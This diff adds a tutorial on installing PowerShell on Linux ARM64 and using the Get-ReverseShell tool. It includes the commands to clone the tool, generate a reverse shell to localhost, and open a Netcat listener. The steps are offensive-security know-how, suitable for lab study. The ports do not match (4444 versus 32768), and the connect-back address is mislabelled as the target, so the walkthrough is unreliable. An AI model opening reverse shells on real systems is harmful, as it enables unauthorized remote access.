@@ -1,0 +1,59 @@
+PowerShell Installation
+Before using the Get-ReverseShell tool, ensure you have PowerShell installed on your Linux system. Follow these commands to install PowerShell (v7.3.4) on Linux ARM64:
+
+Command:
+mkdir pwsh-install && cd pwsh-install
+This command creates a new directory named pwsh-install and navigates into it, setting up a workspace for the installation.
+
+Command:
+wget https://github.com/PowerShell/PowerShell/releases/download/v7.3.4/powershell-7.3.4-linux-arm64.tar.gz
+This command downloads the PowerShell tarball for Linux ARM64 from GitHub.
+
+Command:
+tar -xvzf powershell-7.3.4-linux-arm64.tar.gz
+This command extracts the downloaded tar.gz file with verbose output, showing all extracted files.
+
+Command:
+sudo mkdir -p /opt/microsoft/powershell/7
+This command creates the destination directory for PowerShell.
+
+Command:
+sudo mv * /opt/microsoft/powershell/7/
+This command moves the extracted files into the PowerShell installation directory.
+
+Command:
+sudo ln -s /opt/microsoft/powershell/7/pwsh /usr/bin/pwsh
+This command creates a symbolic link for the pwsh executable, making it easily accessible from the command line.
+
+
+
+
+Tool Information
+The tool Get-ReverseShell is available on GitHub and can be cloned and used for creating reverse shell connections. The commands provided below guide you through the process of setting it up and using it.
+
+Commands and Explanations
+Command:
+git clone https://github.com/gh0x0st/Get-ReverseShell.git
+This command clones the Get-ReverseShell repository from GitHub to your local machine, allowing you to access the tool’s files.
+
+Command:
+pwsh
+The pwsh command starts PowerShell Core, the cross-platform scripting environment used to run PowerShell scripts, such as get-reverseshell.ps1.
+
+Command:
+Import-Module ./get-reverseshell.ps1
+This command imports the get-reverseshell.ps1 module into your PowerShell session, loading the functions needed to establish reverse shell connections.
+
+Command:
+Get-ReverseShell -Ip 127.0.0.1 -Port 4444
+This command initiates a reverse shell connection using the Get-ReverseShell function. The -Ip parameter specifies the target IP (localhost in this example), and the -Port parameter sets the connection port.
+
+Command:
+nc -nvlp 32768
+The nc command (from Netcat) is used to listen for incoming connections. The flags mean:
+
+-n: No DNS resolution.
+-v: Verbose output.
+-l: Listen mode.
+-p: Port number (32768 in this example).
+Netcat is a versatile tool for network connections, diagnostics, and data transfer.
